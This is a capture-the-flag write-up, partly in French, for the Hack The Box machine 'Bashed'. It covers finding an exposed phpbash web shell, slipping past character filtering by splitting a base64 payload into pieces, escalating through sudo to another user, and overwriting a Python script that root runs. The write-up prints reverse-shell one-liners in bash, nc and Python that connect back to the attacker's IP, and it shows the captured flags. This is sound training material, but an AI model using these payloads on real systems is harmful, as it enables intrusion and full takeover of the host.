# HTB - Bashed 10.10.10.68



- Linux 4.4.0-62-generic #83-Ubuntu SMP UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 16.04.2 LTS

- Find /dev/ directory and use /dev/phpshell.php
- Upgrade to nc shell
- Get user
- use sudo to get another user
- test.py owned by new user is run by root...
- Get root


## Nmap
```
# Nmap 7.70 scan initiated Sun Sep 15 14:24:20 2019 as: nmap -sC -sV -A -o enum/nmap_10.10.10.68_recon.txt 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.043s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Aggressive OS guesses: Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.2 - 4.9 (94%), Linux 3.8 - 3.11 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 4.8 (94%), Linux 4.9 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 113/tcp)
HOP RTT      ADDRESS
1   44.20 ms 10.10.14.1
2   44.23 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 15 14:24:37 2019 -- 1 IP address (1 host up) scanned in 18.14 seconds
```

HTTP only server

## 80: 

![](images/http:__10.10.10.68:80.png)
The site is used to developp phpbash


## dirb -> http://10.10.10.68/dev

Directory is browsable...
Found http://10.10.10.68/dev

## http://10.10.10.68/dev/phpbash.php

```
www-data@bashed
:/var/www/html/dev# id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

# ls -alR /home

/home:
total 16
drwxr-xr-x 4 root root 4096 Dec 4 2017 .
drwxr-xr-x 23 root root 4096 Dec 4 2017 ..
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 scriptmanager

/home/arrexel:
total 36
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
-rw------- 1 arrexel arrexel 1 Dec 23 2017 .bash_history
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Dec 4 2017 user.txt
ls: cannot open directory '/home/arrexel/.cache': Permission denied

/home/arrexel/.nano:
total 8
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 ..

/home/scriptmanager:
total 28
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
-rw------- 1 scriptmanager scriptmanager 2 Dec 4 2017 .bash_history
-rw-r--r-- 1 scriptmanager scriptmanager 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec 4 2017 .bashrc
drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec 4 2017 .nano
-rw-r--r-- 1 scriptmanager scriptmanager 655 Dec 4 2017 .profile

/home/scriptmanager/.nano:
total 8
drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec 4 2017 .
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 ..
www-data@bashed
:/var/www/html/dev# cat /home/arrexel/user.txt

XXXXXXXXXXXXXXXXXXXXXXXX
```

## System

```

www-data@bashed
:/var/www/html/dev# uname -a

Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@bashed # cat /etc/issue
Ubuntu 16.04.2 LTS \n \l


```


## Escalation

```
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL

:/var/www/html/dev# sudo -S -u scriptmanager whoami

scriptmanager
```


## Shell
```
echo "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1">/tmp/a

```
Les caractères & et + sont filtrés
Le + met le bazard dans le text retourné.
Une injection regexp ??

```
:/var/www/html/dev# print '+'

Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
```


On encode 'echo "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1">/tmp/a' en base64
print 'echo "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1">/tmp/a' > base64
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMzIgNDQ0NCA+L3RtcC9mCg==

Les + doivent être remplacés...
```
printf '+' |base64
Kw==

printf 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI'>/tmp/a
printf "Kw==" | base64 -d >>/tmp/a
printf 'JjF8bmMgMTAuMTAuMTQuMzIgNDQ0NCA' >>/tmp/a
printf "Kw==" | base64 -d >>/tmp/a
printf 'L3RtcC9mCg==' >>/tmp/a


printf 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI'>/tmp/a; printf "Kw==" | base64 -d >>/tmp/a; printf 'JjF8bmMgMTAuMTAuMTQuMzIgNDQ0NCA' >>/tmp/a; printf "Kw==" | base64 -d >>/tmp/a; printf 'L3RtcC9mCg==' >>/tmp/a

cat /tmp/a | base64 -d >/tmp/b

chmod 777 /tmp/b   car le a+x est filtré...
/tmp/b
```

On recupère le shell
```
# nc -lvp 4444
listening on [any] 4444 ...

10.10.10.68: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.68] 40118
/bin/sh: 0: can't access tty; job control turned off
$ $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
C'est à peine mieux, mais au moins, c'est pas filté :)


```
# sudo -S -u scriptmanager /bin/bash

$ ls -al /
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
....
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Sep 15 06:26 scripts

ls -al
total 20
drwxrwxr--  2 scriptmanager scriptmanager 4096 Sep 15 06:26 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep 15 06:27 test.txt
-rw-r--r--  1 root          root            12 Sep 15 06:25 test.txt.old


```

test.py is regularly executed by root...

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.32\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py
```

Get reverse shell
```
nc -lvp 4445
listening on [any] 4445 ...
10.10.10.68: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.68] 40970
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cc4f0afe3a1026d402ba10329674a8e2
```

